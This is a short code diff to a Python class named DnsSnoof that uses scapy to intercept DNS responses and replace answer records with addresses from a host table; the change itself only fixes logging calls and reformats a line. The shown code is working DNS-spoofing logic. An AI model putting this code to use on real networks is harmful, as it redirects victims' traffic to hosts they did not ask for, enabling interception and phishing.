@@ -26,17 +26,16 @@ class DnsSnoof:
         scapy_packet = IP(packet.get_payload())
         if scapy_packet.haslayer(DNSRR):
             try:
-                log.info(f'[original] {scapy_packet[DNSRR].summary}')
+                log.info(f'[original] {scapy_packet[DNSRR].summary()}')
                 query_name = scapy_packet[DNSQR].qname
                 if query_name in self.hostDict:
-                    scapy_packet[DNS].an = DNSRR(
-                        rrname=query_name, rdata=self.hostDict[query_name])
+                    scapy_packet[DNS].an = DNSRR(rrname=query_name, rdata=self.hostDict[query_name])
                     scapy_packet[DNS].ancount = 1
                     del scapy_packet[IP].len
                     del scapy_packet[IP].chksum
                     del scapy_packet[UDP].len
                     del scapy_packet[UDP].chksum
-                    log.info(f'[modified] {scapy_packet[DNSRR].summary}')
+                    log.info(f'[modified] {scapy_packet[DNSRR].summary()}')
                 else:
                     log.info(f'[not modified] {scapy_packet[DNSRR].rdata}')
             except IndexError as ie:
